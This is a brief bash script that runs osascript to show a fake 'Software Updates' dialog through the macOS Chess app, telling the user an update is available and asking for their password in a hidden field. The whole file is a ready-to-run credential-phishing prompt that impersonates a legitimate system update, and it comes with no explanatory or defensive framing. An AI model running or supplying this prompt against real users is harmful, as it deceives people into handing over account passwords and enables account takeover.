#!/bin/bash

osascript -e 'tell app "Chess" to activate' -e 'tell app "Chess" to display dialog "New Software update available, enter your password to upgrade" & return & return default answer "" with icon 1 with hidden answer with title "Software Updates"'
